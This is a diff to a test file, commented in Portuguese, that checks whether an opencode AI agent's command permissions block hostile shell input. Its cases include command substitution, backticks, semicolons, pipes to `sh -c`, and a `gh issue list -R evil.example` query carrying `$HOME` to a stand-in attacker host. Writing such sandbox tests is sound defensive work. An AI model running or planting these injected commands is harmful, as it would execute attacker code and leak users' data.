@@ -2,8 +2,9 @@
 /* Caça do `opencode run` do "Relatar um problema" (#126): pega a config que
    `opencodeCommand` monta, põe um provedor OpenAI-compatible local no lugar do
    grátis e roda o binário 2.x de verdade. Prova o que o comando promete:
-   `npm --prefix desk run doctor` e `gh issue list` rodam; `touch`, `echo >`,
-   `cd desk && touch` são recusados; `write` e `webfetch` nem aparecem na lista
+   `npm --prefix desk run doctor` e a busca de `gh issue list` no repo fixo
+   rodam; `touch`, `echo >`, `cd desk && touch`, busca com variável ou `-R`
+   para outro host são recusados; `write` e `webfetch` nem aparecem na lista
    de ferramentas; e um `opencode.json` hostil no projeto não reabre nada,
    porque `OPENCODE_CONFIG_CONTENT` é o último config lido.
 
@@ -195,6 +196,8 @@ for (const [label, command, created] of [
 for (const [label, command] of [
   ['substituição $()', 'gh issue list --repo FariaDev/summa --search "$(touch pwned)"'],
   ['crase', 'gh issue list --repo FariaDev/summa --search "`touch pwned`"'],
+  ['-R para outro host', 'gh issue list -R evil.example/a/b --search "$HOME"'],
+  ['variável no --search', 'gh issue list --repo FariaDev/summa --state all --search "$HOME"'],
   ['ponto e vírgula', 'gh issue list; touch pwned'],
   ['pipe', 'gh issue list | sh -c "touch pwned"'],
   ['&&', 'gh issue list && touch pwned'],
